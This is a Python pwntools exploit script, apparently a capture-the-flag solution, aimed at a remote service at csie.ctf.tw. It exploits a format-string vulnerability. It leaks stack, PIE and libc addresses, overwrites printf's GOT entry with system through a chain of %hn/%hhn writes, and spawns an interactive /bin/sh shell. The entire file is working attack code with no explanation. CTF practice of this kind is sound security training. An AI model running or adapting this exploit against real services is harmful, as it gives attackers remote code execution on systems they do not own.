from pwn import *
from time import sleep

r = remote("csie.ctf.tw", 10130)
# r = remote("127.0.0.1", 8888)

printf_got_off = 0x200da8
system_off = 0x4f440

r.recvuntil(":)\n")
r.sendline("%6$p.%7$p.%11$p.")

# leak stack
r.recvuntil("0x")
stack = int(r.recvuntil(".")[:-1], 16)
jump = (stack + 0x10) & 0xff
# leak pie
r.recvuntil("0x")
pie = int(r.recvuntil(".")[:-1], 16) - 0x8ce
# leak libc
# __libc_start_main + 231
r.recvuntil("0x")
libc = int(r.recvuntil(".")[:-1], 16) - 0x21b97

printf_got = pie + printf_got_off
system = libc + system_off

# raw_input('aaa')

# set %10 to printf_got
r.send( "%{}c%8$hn".format(printf_got & 0xffff) )
r.recv()
sleep(1)
r.send( "%{}c%6$hhn".format(jump + 2) )
r.recv()
sleep(1)
r.send( "%{}c%8$hn".format( (printf_got >> 16) & 0xffff ) )
r.recv()
sleep(1)
r.send( "%{}c%6$hhn".format(jump + 4) )
r.recv()
sleep(1)
r.send( "%{}c%8$hn".format( (printf_got >> 32) & 0xffff ) )
r.recv()
sleep(1)

# set %11 to printf_got + 1
r.send( "%{}c%6$hhn".format(jump + 8) )
r.recv()
sleep(1)
r.send( "%{}c%8$hn".format( (printf_got + 1) & 0xffff ) )
r.recv()
sleep(1)
r.send( "%{}c%6$hhn".format(jump + 8 + 2) )
r.recv()
sleep(1)
r.send( "%{}c%8$hn".format( ((printf_got + 1) >> 16) & 0xffff ) )
r.recv()
sleep(1)
r.send( "%{}c%6$hhn".format(jump + 8 + 4) )
r.recv()
sleep(1)
r.send( "%{}c%8$hn".format( ((printf_got + 1) >> 32) & 0xffff ) )
r.recv()
sleep(1)

r.send( "%{}c%10$hhn%{}c%11$hn".format(system & 0xff, ((system & 0xffff00) >> 8) - (system & 0xff)) )
sleep(1)

r.send("/bin/sh\x00")

r.interactive()
